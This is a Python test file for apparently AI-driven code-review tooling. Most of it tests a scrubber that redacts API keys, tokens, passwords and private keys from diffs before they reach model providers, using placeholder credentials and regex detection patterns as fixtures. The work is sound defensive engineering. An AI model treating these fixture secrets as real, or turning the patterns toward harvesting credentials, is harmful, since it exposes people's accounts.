"""Tests for ensemble review infrastructure scripts."""

from __future__ import annotations

import json
import os
import re
import shlex
import shutil
import signal
import subprocess
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path
from types import SimpleNamespace
from typing import Any
from unittest import mock

import pytest
from helpers import AGENT_DOC, REPO_ROOT, runner_script, shell_function

from scripts.review_loop import backends, claude_tools
from scripts.review_loop import reviewers as reviewers_mod
from scripts.review_loop.artifacts import describe_outputs, write_artifacts_key
from scripts.review_loop.claude_tools import SECRET_READS, claude_denied

#: The runner's two ways of telling its reviewers' groups from others: pgrep, and
#: reading /proc where pgrep cannot (Linux only).
GROUP_CHECKS = [
    "pgrep",
    pytest.param(
        "proc",
        marks=pytest.mark.skipif(
            not Path("/proc/self/stat").exists(), reason="needs /proc"
        ),
    ),
]

SCRUB_SCRIPT = REPO_ROOT / "scripts" / "scrub_diff.py"
PREFLIGHT_SCRIPT = REPO_ROOT / "scripts" / "review_preflight.py"
VALIDATE_SCRIPT = REPO_ROOT / "scripts" / "validate_review_results.py"


def _liveness(runner: str) -> str:
    """The runner's live_group, and the /proc reader it falls back on."""
    return shell_function(runner, "live_group") + shell_function(
        runner, "session_groups"
    )


# Imported as well as run as a subprocess. Most of the scrubber's behaviour is
# about a whole diff and is tested through its real entry point below; the
# per-line decisions are clearer asserted one line at a time.
sys.path.insert(0, str(REPO_ROOT / "scripts"))
import scrub_diff  # noqa: E402


class TestScrubDiff:
    """Tests for scripts/scrub_diff.py."""

    def _run_scrub(self, input_text: str, *args: str) -> tuple[str, str, int]:
        result = subprocess.run(
            [sys.executable, str(SCRUB_SCRIPT), *args],
            input=input_text,
            capture_output=True,
            text=True,
            timeout=10,
        )
        return result.stdout, result.stderr, result.returncode

    def test_clean_diff_passes_through(self) -> None:
        diff = "diff --git a/foo.py b/foo.py\n+def hello():\n+    pass\n"
        stdout, stderr, code = self._run_scrub(diff)
        assert stdout == diff
        assert code == 0
        assert "redacted" not in stderr

    def test_redacts_api_key(self) -> None:
        diff = '+API_KEY = "abc123"\n'
        stdout, _, code = self._run_scrub(diff)
        assert "REDACTED" in stdout
        assert code == 1

    def test_redacts_password(self) -> None:
        diff = '+password = "hunter2"\n'
        stdout, _, code = self._run_scrub(diff)
        assert "REDACTED" in stdout
        assert code == 1

    def test_redacts_aws_key(self) -> None:
        diff = "+AKIAIOSFODNN7EXAMPLE\n"
        stdout, _, code = self._run_scrub(diff)
        assert "REDACTED" in stdout
        assert code == 1

    def test_redacts_openai_key(self) -> None:
        diff = "+sk-abcdefghijklmnopqrstuvwxyz1234\n"
        stdout, _, code = self._run_scrub(diff)
        assert "REDACTED" in stdout
        assert code == 1

    def test_redacts_github_pat(self) -> None:
        diff = "+ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij\n"
        stdout, _, code = self._run_scrub(diff)
        assert "REDACTED" in stdout
        assert code == 1

    def test_redacts_gitlab_token(self) -> None:
        diff = "+glpat-ABCDEFGHIJKLMNOPQRSTUVwx\n"
        stdout, _, code = self._run_scrub(diff)
        assert "REDACTED" in stdout
        assert code == 1

    def test_redacts_private_key(self) -> None:
        diff = "+-----BEGIN PRIVATE KEY-----\n"
        stdout, _, code = self._run_scrub(diff)
        assert "REDACTED" in stdout
        assert code == 1

    def test_redacts_the_whole_private_key_not_just_its_banner(self) -> None:
        """The body is the key. Redacting only the banner leaks it intact."""
        body = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQ"
        diff = (
            "diff --git a/k.pem b/k.pem\n"
            "+-----BEGIN RSA PRIVATE KEY-----\n"
            f"+{body}\n"
            "+-----END RSA PRIVATE KEY-----\n"
        )
        stdout, _, code = self._run_scrub(diff)
        assert body not in stdout
        assert stdout.count("REDACTED") == 3
        assert code == 1

    @pytest.mark.parametrize(
        "kind",
        ["RSA", "OPENSSH", "EC", "DSA", "ENCRYPTED", "PGP"],
    )
    def test_every_private_key_banner_opens_the_block(self, kind: str) -> None:
        """One narrow banner pattern and one broad one let OPENSSH keys through.

        The block opened only for a banner the credential patterns had already
        redacted, and `BEGIN OPENSSH PRIVATE KEY` matched only the broad one --
        so nothing was redacted, the block never opened, and the scrubber
        exited 0 calling the key clean.
        """
        body = "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAAB"
        diff = (
            "diff --git a/k b/k\n"
            f"+-----BEGIN {kind} PRIVATE KEY-----\n"
            f"+{body}\n"
            f"+-----END {kind} PRIVATE KEY-----\n"
        )
        stdout, _, code = self._run_scrub(diff)
        assert body not in stdout
        assert code == 1

    def test_a_pgp_key_block_banner_is_recognised(self) -> None:
        """Its banner says BLOCK after KEY, which the anchorless search allows."""
        body = "lQOYBGYAAAABCADQ1example"
        diff = (
            "diff --git a/k b/k\n"
            "+-----BEGIN PGP PRIVATE KEY BLOCK-----\n"
            f"+{body}\n"
            "+-----END PGP PRIVATE KEY BLOCK-----\n"
        )
        stdout, _, code = self._run_scrub(diff)
        assert body not in stdout
        assert code == 1

    def test_a_key_block_does_not_swallow_the_rest_of_the_diff(self) -> None:
        """The state machine, not the path rule.

        This used to use `k.pem`, which `_is_secret_file` now redacts whole --
        so the assertion would have passed or failed for the wrong reason. A
        key pasted into a document is where the block logic actually matters.
        """
        diff = (
            "diff --git a/docs/setup.md b/docs/setup.md\n"
            "+-----BEGIN PRIVATE KEY-----\n"
            "+AAAA\n"
            "+-----END PRIVATE KEY-----\n"
            "+after the key\n"
        )
        stdout, _, _ = self._run_scrub(diff)
        assert "+after the key" in stdout

    def test_a_pem_file_is_redacted_to_its_last_line(self) -> None:
        """Including whatever follows the END banner.

        The block logic stops at `END`; the path rule does not, and in a file
        that *is* key material there is nothing after it worth a reviewer's
        eyes.
        """
        diff = (
            "diff --git a/k.pem b/k.pem\n"
            "+-----BEGIN PRIVATE KEY-----\n"
            "+AAAA\n"
            "+-----END PRIVATE KEY-----\n"
            "+after the key\n"
        )
        stdout, _, code = self._run_scrub(diff)
        assert "after the key" not in stdout
        assert code == 1

    def test_an_unterminated_key_block_ends_at_the_next_file(self) -> None:
        """A truncated key must not redact every following file wholesale."""
        diff = (
            "diff --git a/k.pem b/k.pem\n"
            "+-----BEGIN PRIVATE KEY-----\n"
            "+AAAA\n"
            "diff --git a/ok.py b/ok.py\n"
            "+def hello(): pass\n"
        )
        stdout, _, _ = self._run_scrub(diff)
        assert "+def hello(): pass" in stdout

    def test_a_fixture_key_banner_in_a_safe_file_opens_no_block(self) -> None:
        diff = (
            "diff --git a/scripts/scrub_diff.py b/scripts/scrub_diff.py\n"
            "+-----BEGIN PRIVATE KEY-----\n"
            '+re.compile(r"x")\n'
        )
        stdout, _, code = self._run_scrub(diff, "--agent-repo")
        assert "REDACTED" not in stdout
        assert code == 0

    def test_redacts_gcp_service_account(self) -> None:
        diff = '+  "type": "service_account"\n'
        stdout, _, code = self._run_scrub(diff)
        assert "REDACTED" in stdout
        assert code == 1

    def test_does_not_self_redact(self) -> None:
        diff = (
            "diff --git a/scripts/scrub_diff.py"
            " b/scripts/scrub_diff.py\n"
            '+    re.compile(r"sk-[a-zA-Z0-9]{20,128}"),\n'
            "+    re.compile("
            'r"(?i)(password|passwd|pwd)\\s*[:=]"),\n'
        )
        stdout, _, code = self._run_scrub(diff)
        assert "REDACTED" not in stdout
        assert code == 0

    def test_does_not_redact_test_file(self) -> None:
        diff = (
            "diff --git a/tests/test_review_scripts.py"
            " b/tests/test_review_scripts.py\n"
            "+        diff = '+API_KEY = \"abc123\"\\n'\n"
            "+        diff = '+password = \"hunter2\"\\n'\n"
        )
        stdout, _, code = self._run_scrub(diff, "--agent-repo")
        assert "REDACTED" not in stdout
        assert code == 0
        # In a host project, a file of the same name is the host's: scrubbed as any.
        stdout, _, code = self._run_scrub(diff)
        assert "REDACTED" in stdout and code == 1

    def test_exit_code_nonzero_on_redaction(self) -> None:
        diff = '+secret_key = "abc123def456"\n'
        _, _, code = self._run_scrub(diff)
        assert code == 1

    def test_preserves_diff_structure(self) -> None:
        diff = (
            "diff --git a/config.py b/config.py\n"
            "--- a/config.py\n"
            "+++ b/config.py\n"
            "@@ -1,3 +1,4 @@\n"
            "+API_KEY = secret\n"
            " def main():\n"
            "     pass\n"
        )
        stdout, _, _ = self._run_scrub(diff)
        assert "diff --git" in stdout
        assert "--- a/config.py" in stdout
        assert "@@ -1,3 +1,4 @@" in stdout
        assert "def main():" in stdout

    def test_counts_redactions_on_stderr(self) -> None:
        diff = (
            '+API_KEY = "sk-abc123def456ghi"\n'
            '+password = "hunter22"\n'
            "+token=ghp_abcdefghij1234567890\n"
        )
        _, stderr, _ = self._run_scrub(diff)
        assert "3 line(s) redacted" in stderr

    def test_does_not_redact_a_domain_word_called_token(self) -> None:
        """A token is a game object in Magic, a node in a parser, a colour in a
        design system. Flagging the word aborts those projects' reviews entirely.
        """
        diff = (
            "+        case CreateTokens(count=count, token=token):\n"
            "+def encode_token(token: TokenSpec) -> JsonObject:\n"
            "+    token: TokenSpec\n"
        )
        stdout, _, code = self._run_scrub(diff)
        assert "REDACTED" not in stdout
        assert code == 0

    def test_does_not_redact_type_annotations(self) -> None:
        diff = "+    api_key: str\n+    password: str | None = None\n"
        stdout, _, code = self._run_scrub(diff)
        assert "REDACTED" not in stdout
        assert code == 0

    def test_does_not_redact_reading_a_secret_from_the_environment(self) -> None:
        """Naming a secret is not leaking one."""
        diff = "+access_token = os.environ['TOKEN']\n"
        stdout, _, _code = self._run_scrub(diff)
        assert "REDACTED" not in stdout

    def test_still_redacts_a_quoted_credential(self) -> None:
        diff = '+token: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"\n'
        stdout, _, code = self._run_scrub(diff)
        assert "REDACTED" in stdout
        assert code == 1

    def test_still_redacts_an_unquoted_credential(self) -> None:
        diff = "+token=ghp_abcdefghij1234567890abcdef\n"
        stdout, _, code = self._run_scrub(diff)
        assert "REDACTED" in stdout
        assert code == 1

    def test_does_not_match_dotenv_in_prose(self) -> None:
        diff = "+# See the .environment docs for details\n"
        stdout, _, code = self._run_scrub(diff)
        assert "REDACTED" not in stdout
        assert code == 0

    def test_redacts_a_dotenv_path_added_at_column_zero(self) -> None:
        """The `+` prefix is not part of the file's text and must not hide it."""
        stdout, _, code = self._run_scrub("+.env.production\n")
        assert "REDACTED" in stdout
        assert code == 1

    def test_a_combined_diff_header_does_not_inherit_a_safe_file(self) -> None:
        """`in_safe` used to latch: only `diff --git` reset it."""
        diff = (
            "diff --git a/scripts/scrub_diff.py b/scripts/scrub_diff.py\n"
            '+re.compile(r"x")\n'
            "diff --cc other.py\n"
            '+re.compile(r"y")  # api_key = "supersecret1"\n'
        )
        stdout, _, code = self._run_scrub(diff)
        assert "supersecret1" not in stdout
        assert code == 1

    def test_a_non_utf8_byte_does_not_truncate_the_patch(self) -> None:
        """A crash mid-stream leaves a plausible patch whose tail is unscrubbed."""
        raw = b'diff --git a/x b/x\n+caf\xe9 api_key = "abcdefghij1"\n+trailing line\n'
        result = subprocess.run(
            [sys.executable, str(SCRUB_SCRIPT)],
            input=raw,
            capture_output=True,
            timeout=10,
            env={**os.environ, "LC_ALL": "C", "PYTHONIOENCODING": "ascii"},
        )
        stdout = result.stdout.decode("utf-8", "replace")
        assert "abcdefghij1" not in stdout
        assert "+trailing line" in stdout
        assert result.returncode == 1

    def test_a_dotenv_file_header_is_not_redacted(self) -> None:
        """`--- a/x` and `+++ b/x` start with `-` and `+`, but are structure.

        Redacting them cost the patch its file attribution *and* aborted the
        whole review, because someone committed a `.env.example`.
        """
        diff = (
            "diff --git a/.env.example b/.env.example\n"
            "index 0000000..1111111 100644\n"
            "--- a/.env.example\n"
            "+++ b/.env.example\n"
            "+API_HOST=localhost\n"
        )
        stdout, _, code = self._run_scrub(diff)
        assert stdout == diff
        assert code == 0

    def test_a_dotenv_value_inside_the_file_is_still_redacted(self) -> None:
        stdout, _, code = self._run_scrub("+source .env.production\n")
        assert "REDACTED" in stdout
        assert code == 1

    @pytest.mark.parametrize(
        "key",
        [
            "sk-ant-api03-AbCdEf1234567890GhIjKlMnOpQrStUvWxYz",
            "sk-proj-AbCdEf1234567890GhIjKlMnOpQrStUvWxYz",
            "sk-AbCdEf1234567890GhIjKlMnOpQrStUvWxYz",
        ],
    )
    def test_redacts_current_key_shapes(self, key: str) -> None:
        """A run of plain alphanumerics stops at the first hyphen."""
        stdout, _, code = self._run_scrub(f'+  "{key}"\n')
        assert key not in stdout
        assert code == 1

    def test_a_credential_beside_a_regex_mention_is_still_scrubbed(self) -> None:
        """The safe-file bypass used to fire on `re.compile(` anywhere."""
        diff = (
            "diff --git a/scripts/scrub_diff.py b/scripts/scrub_diff.py\n"
            '+AWS = "AKIAIOSFODNN7EXAMPLE"  # matched by re.compile(...)\n'
        )
        stdout, _, code = self._run_scrub(diff)
        assert "AKIAIOSFODNN7EXAMPLE" not in stdout
        assert code == 1

    def test_a_removed_comment_line_is_not_mistaken_for_a_header(self) -> None:
        """`-- password = ...` removed arrives as `--- password = ...`.

        Indistinguishable from a file header by prefix alone, and classifying it
        as metadata wrote the credential straight through with exit 0.
        """
        diff = (
            "diff --git a/q.sql b/q.sql\n"
            "--- a/q.sql\n"
            "+++ b/q.sql\n"
            "@@ -1 +1 @@\n"
            '-- password = "hunter2abc"\n'
            "+SELECT 1\n"
        )
        stdout, _, code = self._run_scrub(diff)
        assert "hunter2abc" not in stdout
        assert code == 1

    def test_an_added_comment_line_is_not_mistaken_for_a_header_either(self) -> None:
        diff = (
            "diff --git a/q.sql b/q.sql\n"
            "--- a/q.sql\n"
            "+++ b/q.sql\n"
            "@@ -1 +1 @@\n"
            '+++ password = "hunter2abc"\n'
        )
        stdout, _, code = self._run_scrub(diff)
        assert "hunter2abc" not in stdout
        assert code == 1

    def test_the_real_file_headers_are_still_left_alone(self) -> None:
        diff = (
            "diff --git a/.env.example b/.env.example\n"
            "--- a/.env.example\n"
            "+++ b/.env.example\n"
            "@@ -1 +1 @@\n"
            "+API_HOST=localhost\n"
        )
        stdout, _, code = self._run_scrub(diff)
        assert stdout == diff
        assert code == 0

    def test_a_file_that_is_entirely_a_credential_is_redacted_by_path(self) -> None:
        """No content pattern can catch this.

        Written after a review shipped one: a project keeping its server token
        in `data/token` added the file in a branch, the diff went to four model
        providers, and every pattern here matched nothing. There is no
        `token =` for a keyword pattern to see, and a 43-character base64url
        blob carries no vendor prefix for a shape pattern to see. The scrubber
        exited 0 and called it clean.
        """
        diff = (
            "diff --git a/data/token b/data/token\n"
            "new file mode 100600\n"
            "--- /dev/null\n"
            "+++ b/data/token\n"
            "@@ -0,0 +1 @@\n"
            "+ZbSkuZvQTHh3wnGcs7PDHkM6ccH3EIdcBji_vFNFCg\n"
        )
        stdout, _, code = self._run_scrub(diff)
        assert "ZbSkuZvQTHh3" not in stdout
        assert code == 1
        # The structure survives, so a reviewer still sees which file changed.
        assert "+++ b/data/token" in stdout

    def test_a_secret_file_in_a_combined_diff_is_redacted_too(self) -> None:
        """`diff --cc` carries bare paths with no `a/`/`b/` prefix, and the
        section still holds the file's contents. `_is_safe_file` reads only
        prefixed words, which is right for a bypass and wrong for a refusal.
        """
        diff = (
            "diff --cc data/token\n"
            "@@@ -1,1 -1,1 +1,1 @@@\n"
            "++a-live-token-value-0123456789abcd\n"
        )
        stdout, _, code = self._run_scrub(diff)
        assert "a-live-token-value" not in stdout
        assert code == 1

    def test_a_secret_file_renamed_to_an_innocent_name_is_still_redacted(self) -> None:
        """Either side naming key material is enough. A rename is a way to move
        a token's content into a file called `notes.txt`, and the content is the
        secret either way.
        """
        diff = (
            "diff --git a/data/token b/data/notes.txt\n"
            "similarity index 100%\n"
            "@@ -1 +1 @@\n"
            "+a-live-token-value-0123456789abcd\n"
        )
        stdout, _, code = self._run_scrub(diff)
        assert "a-live-token-value" not in stdout
        assert code == 1

    @pytest.mark.parametrize(
        "path",
        [
            "src/token.py",
            "src/tokens.json",
            "docs/token-design.md",
            ".env.example",
            "keys/server.pub",
        ],
    )
    def test_a_file_that_merely_sounds_like_a_credential_is_left_alone(self, path: str) -> None:
        """The cost of a false positive here is a reviewer losing a whole file.

        `token.py` is a parser in half the projects that have one, and a public
        key is public -- redacting it buys nothing and costs context.
        """
        diff = f"diff --git a/{path} b/{path}\n@@ -1 +1 @@\n+def parse(text):\n"
        stdout, _, code = self._run_scrub(diff)
        assert stdout == diff
        assert code == 0

    def test_empty_input(self) -> None:
        stdout, stderr, code = self._run_scrub("")
        assert stdout == ""
        assert code == 0


class TestReviewPreflight:
    """Tests for scripts/review_preflight.py."""

    def _run_preflight(
        self, tmp_path: Path
    ) -> tuple[dict, subprocess.CompletedProcess[str]]:
        output = tmp_path / "audit.json"
        proc = subprocess.run(
            [
                sys.executable,
                str(PREFLIGHT_SCRIPT),
                "--output",
                str(output),
            ],
            capture_output=True,
            text=True,
            timeout=30,
        )
        audit = json.loads(output.read_text()) if output.exists() else {}
        return audit, proc

    def test_runs_successfully(self, tmp_path: Path) -> None:
        audit, _ = self._run_preflight(tmp_path)
        assert "git" in audit
        assert "signed_manifests" in audit
        assert "n_warnings" in audit
        assert isinstance(audit["git"]["branch"], str)
        assert isinstance(audit["git"]["commit"], str)

    def test_output_has_required_sections(self, tmp_path: Path) -> None:
        audit, _ = self._run_preflight(tmp_path)
        required = {
            "timestamp",
            "git",
            "git_command_warnings",
            "signed_manifests",
            "changed_artifacts",
            "suspicious_patterns",
            "test_coverage_alignment",
            "coverage_gaps",
            "coverage_warnings",
            "coverage_target_pct",
            "n_warnings",
        }
        assert required <= set(audit.keys())
        assert isinstance(audit["coverage_gaps"], list)
        assert isinstance(audit["coverage_warnings"], list)
        assert isinstance(audit["coverage_target_pct"], int)

    def test_git_command_warnings_populated_on_bad_remote(self, tmp_path: Path) -> None:
        from scripts.review_preflight import _run_git

        warnings: list[str] = []
        _run_git(
            [
                "diff",
                "--merge-base",
                "nonexistent/branch",
                "--name-only",
            ],
            warnings,
        )
        assert len(warnings) > 0
        assert "git failed" in warnings[0]

    def test_missing_manifest_reported(self) -> None:
        from scripts.review_preflight import (
            SIGNED_MANIFESTS,
            audit_signed_manifests,
        )

        old = dict(SIGNED_MANIFESTS)
        try:
            SIGNED_MANIFESTS["test_missing"] = "nonexistent.json"
            results = audit_signed_manifests()
            missing = [r for r in results if r["manifest"] == "test_missing"]
            assert len(missing) == 1
            assert "warning" in missing[0]
            assert "missing" in missing[0]["warning"]
        finally:
            SIGNED_MANIFESTS.clear()
            SIGNED_MANIFESTS.update(old)


class TestValidateReviewResults:
    """Tests for scripts/validate_review_results.py."""

    def _make_valid_result(self) -> dict:
        return {
            "reviewer": "security",
            "model": "test-model",
            "findings": [
                {
                    "severity": "warning",
                    "confidence": "high",
                    "category": "security",
                    "file": "foo.py",
                    "line": 10,
                    "issue": "test issue",
                    "rationale": "test rationale",
                    "observed_or_inferred": "observed_in_diff",
                    "blocking": False,
                    "suggested_fix": "No change needed.",
                }
            ],
            "overall_assessment": "Looks good.",
        }

    def test_valid_result_passes(self, tmp_path: Path) -> None:
        result_path = tmp_path / "result.json"
        result_path.write_text(json.dumps(self._make_valid_result()))
        proc = subprocess.run(
            [sys.executable, str(VALIDATE_SCRIPT), str(result_path)],
            capture_output=True,
            text=True,
            timeout=10,
        )
        assert proc.returncode == 0
        assert "PASS" in proc.stdout

    def test_rejects_extra_top_level_field(self, tmp_path: Path) -> None:
        data = self._make_valid_result()
        data["extra"] = True
        result_path = tmp_path / "result.json"
        result_path.write_text(json.dumps(data))
        proc = subprocess.run(
            [sys.executable, str(VALIDATE_SCRIPT), str(result_path)],
            capture_output=True,
            text=True,
            timeout=10,
        )
        assert proc.returncode == 1
        assert "Additional properties" in proc.stdout

    def test_rejects_extra_finding_field(self, tmp_path: Path) -> None:
        data = self._make_valid_result()
        data["findings"][0]["extra_field"] = "bad"
        result_path = tmp_path / "result.json"
        result_path.write_text(json.dumps(data))
        proc = subprocess.run(
            [sys.executable, str(VALIDATE_SCRIPT), str(result_path)],
            capture_output=True,
            text=True,
            timeout=10,
        )
        assert proc.returncode == 1
        assert "Additional properties" in proc.stdout

    def test_rejects_invalid_severity(self, tmp_path: Path) -> None:
        data = self._make_valid_result()
        data["findings"][0]["severity"] = "blocker"
        result_path = tmp_path / "result.json"
        result_path.write_text(json.dumps(data))
        proc = subprocess.run(
            [sys.executable, str(VALIDATE_SCRIPT), str(result_path)],
            capture_output=True,
            text=True,
            timeout=10,
        )
        assert proc.returncode == 1

    def test_allows_null_optional_fields(self, tmp_path: Path) -> None:
        data = self._make_valid_result()
        data["findings"][0]["repro_command"] = None
        data["findings"][0]["contract_reference"] = None
        result_path = tmp_path / "result.json"
        result_path.write_text(json.dumps(data))
        proc = subprocess.run(
            [sys.executable, str(VALIDATE_SCRIPT), str(result_path)],
            capture_output=True,
            text=True,
            timeout=10,
        )
        assert proc.returncode == 0

    def test_allows_custom_reviewer_name(self, tmp_path: Path) -> None:
        data = self._make_valid_result()
        data["reviewer"] = "adversarial"
        result_path = tmp_path / "result.json"
        result_path.write_text(json.dumps(data))
        proc = subprocess.run(
            [sys.executable, str(VALIDATE_SCRIPT), str(result_path)],
            capture_output=True,
            text=True,
            timeout=10,
        )
        assert proc.returncode == 0

    def test_rejects_missing_required_finding_field(self, tmp_path: Path) -> None:
        data = self._make_valid_result()
        del data["findings"][0]["blocking"]
        result_path = tmp_path / "result.json"
        result_path.write_text(json.dumps(data))
        proc = subprocess.run(
            [sys.executable, str(VALIDATE_SCRIPT), str(result_path)],
            capture_output=True,
            text=True,
            timeout=10,
        )
        assert proc.returncode == 1
        assert "blocking" in proc.stdout

    def test_file_not_found(self) -> None:
        proc = subprocess.run(
            [sys.executable, str(VALIDATE_SCRIPT), "/nonexistent.json"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        assert proc.returncode == 1
        assert "file not found" in proc.stdout

    def test_malformed_json_handled(self, tmp_path: Path) -> None:
        result_path = tmp_path / "bad.json"
        result_path.write_text("{not valid json")
        proc = subprocess.run(
            [sys.executable, str(VALIDATE_SCRIPT), str(result_path)],
            capture_output=True,
            text=True,
            timeout=10,
        )
        assert proc.returncode == 1
        assert "failed to parse" in proc.stdout

    def test_empty_findings_passes(self, tmp_path: Path) -> None:
        data = self._make_valid_result()
        data["findings"] = []
        result_path = tmp_path / "result.json"
        result_path.write_text(json.dumps(data))
        proc = subprocess.run(
            [sys.executable, str(VALIDATE_SCRIPT), str(result_path)],
            capture_output=True,
            text=True,
            timeout=10,
        )
        assert proc.returncode == 0
        assert "0 findings" in proc.stdout

    def test_omitted_optional_fields_passes(self, tmp_path: Path) -> None:
        data = self._make_valid_result()
        for key in (
            "repro_command",
            "contract_reference",
            "line",
        ):
            data["findings"][0].pop(key, None)
        result_path = tmp_path / "result.json"
        result_path.write_text(json.dumps(data))
        proc = subprocess.run(
            [sys.executable, str(VALIDATE_SCRIPT), str(result_path)],
            capture_output=True,
            text=True,
            timeout=10,
        )
        assert proc.returncode == 0


class TestRunGate:
    """The mandatory CI gate (lint + format + mypy + tests)."""

    def test_run_gate_returns_bool_and_str(self, tmp_path: Path) -> None:
        from scripts.review_until_converged import run_gate

        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "tests").mkdir()
        ok, output = run_gate(repo)
        # ok may be True (all tools skipped or passed) or False (mypy
        # bails early because scripts/ is missing in the empty repo).
        # Either is a valid outcome for this smoke test -- what we care
        # about is that the gate ran at least the first step and
        # returned structured output without crashing.
        assert isinstance(ok, bool)
        assert isinstance(output, str)
        assert "ruff check" in output

    def test_run_gate_steps_in_order(self) -> None:
        """The gate definition must include all four mandatory steps."""
        import inspect

        from scripts.review_until_converged import run_gate

        source = inspect.getsource(run_gate)
        for label in ("ruff check", "ruff format", "mypy", "pytest"):
            assert label in source


def _two_commit_repo(repo: Path) -> Path:
    """A git repo with two commits, so HEAD~1 resolves."""
    repo.mkdir(parents=True, exist_ok=True)
    env = {
        "GIT_AUTHOR_NAME": "t",
        "GIT_AUTHOR_EMAIL": "t@t",
        "GIT_COMMITTER_NAME": "t",
        "GIT_COMMITTER_EMAIL": "t@t",
    }
    subprocess.run(["git", "init", "-q", "-b", "main"], cwd=repo, check=True, env=env)
    for n, body in enumerate(("a = 1\n", "a = 2\n")):
        (repo / "x.py").write_text(body)
        subprocess.run(["git", "add", "x.py"], cwd=repo, check=True, env=env)
        subprocess.run(
            ["git", "commit", "-q", "-m", str(n)], cwd=repo, check=True, env=env
        )
    return repo


class TestSecretsDetected:
    """The scrubber must STOP the loop, not just warn."""

    def test_exception_is_exported(self) -> None:
        from scripts.review_until_converged import SecretsDetectedError

        assert issubclass(SecretsDetectedError, RuntimeError)

    def test_collect_diff_raises_on_redaction(self, tmp_path: Path) -> None:
        # Stub scrub_diff.py with one that exits 1 to simulate redaction.
        # Set up a git repo with one commit + a staged change so collect_diff
        # has a real diff to feed the (fake) scrubber.
        from unittest.mock import patch

        from scripts.review_loop.diff import SecretsDetectedError, collect_diff

        round_dir = tmp_path / "round"
        round_dir.mkdir()
        repo = tmp_path / "repo"
        repo.mkdir()
        env = {
            "GIT_AUTHOR_NAME": "t",
            "GIT_AUTHOR_EMAIL": "t@t",
            "GIT_COMMITTER_NAME": "t",
            "GIT_COMMITTER_EMAIL": "t@t",
        }
        subprocess.run(
            ["git", "init", "-q", "-b", "main"], cwd=repo, check=True, env=env
        )
        (repo / "x.py").write_text("a = 1\n")
        subprocess.run(["git", "add", "x.py"], cwd=repo, check=True, env=env)
        subprocess.run(
            ["git", "commit", "-q", "-m", "init"], cwd=repo, check=True, env=env
        )
        # Need HEAD~1 to resolve, so make a second commit.
        (repo / "x.py").write_text("a = 2\n")
        subprocess.run(["git", "add", "x.py"], cwd=repo, check=True, env=env)
        subprocess.run(
            ["git", "commit", "-q", "-m", "two"], cwd=repo, check=True, env=env
        )

        fake_scrubber = tmp_path / "scrub_diff.py"
        fake_scrubber.write_text(
            'import sys\nprint("redacted: 1 line", file=sys.stderr)\nsys.exit(1)\n'
        )
        with patch("scripts.review_loop.diff.SCRIPTS_DIR", tmp_path):
            with pytest.raises(SecretsDetectedError) as exc_info:
                collect_diff(round_dir, repo)
        assert "rotated" in str(exc_info.value)

    def test_collect_diff_distinguishes_a_crash_from_a_clean_block(
        self, tmp_path: Path
    ) -> None:
        """Exit 2 means the patch is truncated, not that a secret leaked."""
        from unittest.mock import patch

        from scripts.review_loop.diff import ScrubberFailedError, collect_diff

        round_dir = tmp_path / "round"
        round_dir.mkdir()
        repo = _two_commit_repo(tmp_path / "repo")

        fake_scrubber = tmp_path / "scrub_diff.py"
        fake_scrubber.write_text(
            'import sys\nprint("aborted", file=sys.stderr)\nsys.exit(2)\n'
        )
        with patch("scripts.review_loop.diff.SCRIPTS_DIR", tmp_path):
            with pytest.raises(ScrubberFailedError) as exc_info:
                collect_diff(round_dir, repo)
        assert "truncated" in str(exc_info.value)
        assert "rotated" not in str(exc_info.value)


@dataclass(slots=True)
class _Dead:
    """A process id nothing can be read for."""

    pid: int = -1


@dataclass(slots=True)
class _Busy:
    """A process whose CPU time can be read: this one's."""

    pid: int = field(default_factory=os.getpid)


class TestReviewerProgress:
    """Knowing which reviewers are still working, without guessing."""

    def test_a_working_reviewer_is_shown_with_what_it_has_written(
        self, tmp_path: Path
    ) -> None:
        """Output size is the signal the streaming backends give."""
        from scripts.review_loop.reviewers import _progress

        (tmp_path / "stderr-2.txt").write_text("x" * 2048)
        procs = [(1, _Dead(), "claude", None, None), (2, _Dead(), "codex", None, None)]
        line = _progress(procs, {2: procs[1]}, tmp_path, 95.0, {})
        assert "R1(claude) done" in line
        assert "R2(codex) 2K" in line
        assert "1m35s" in line

    def test_a_reviewer_that_has_written_nothing_says_so(self, tmp_path: Path) -> None:
        from scripts.review_loop.reviewers import _progress

        procs = [(1, _Dead(), "gemini", None, None)]
        assert "R1(gemini) 0B" in _progress(procs, {1: procs[0]}, tmp_path, 5.0, {})

    def test_a_buffered_backend_is_shown_busy_by_its_cpu_time(
        self, tmp_path: Path
    ) -> None:
        """`claude -p` writes nothing until it finishes, so size says nothing.

        From start to end its output is 0 bytes, and a line that reports only
        size cannot tell "thinking" from "hung" -- which is most of the run.
        """
        from scripts.review_loop.reviewers import _progress

        procs = [(1, _Busy(), "claude", None, None)]
        line = _progress(procs, {1: procs[0]}, tmp_path, 30.0, {1: 0.0})
        assert "R1(claude) 0B busy" in line

    def test_a_quiet_process_is_not_called_busy(self, tmp_path: Path) -> None:
        """Waiting on a network reply is most of what these do."""
        from scripts.review_loop.reviewers import _progress

        procs = [(1, _Busy(), "claude", None, None)]
        line = _progress(procs, {1: procs[0]}, tmp_path, 30.0, {1: 999.0})
        assert "busy" not in line

    def test_cpu_time_is_optional(self, tmp_path: Path) -> None:
        """Linux only. Everywhere else the size signal still works."""
        from scripts.review_loop.reviewers import _cpu_seconds

        assert _cpu_seconds(-1) is None

    def test_codex_progress_is_counted_from_stderr(self, tmp_path: Path) -> None:
        """It reports progress on stderr and its result on stdout, so stdout
        stays empty until the very end -- and looked hung for fifteen minutes.
        """
        from scripts.review_loop.reviewers import _bytes_written

        (tmp_path / "raw-2.txt").write_text("")
        (tmp_path / "stderr-2.txt").write_text("y" * 500)
        assert _bytes_written(tmp_path, 2) == 500


class TestEmptyReviews:
    """A reviewer that found nothing has not reviewed anything."""

    def test_a_silent_reviewer_is_not_counted_as_a_clean_bill(self) -> None:
        from scripts.review_until_converged import _describe_results

        results = [
            {"findings": [{"severity": "warning"}]},
            None,
            {"findings": []},
            {"findings": [{"severity": "warning"}]},
        ]
        line = _describe_results(results, 5000)
        assert "3/4 reviewers returned output" in line
        assert "R3 found nothing" in line
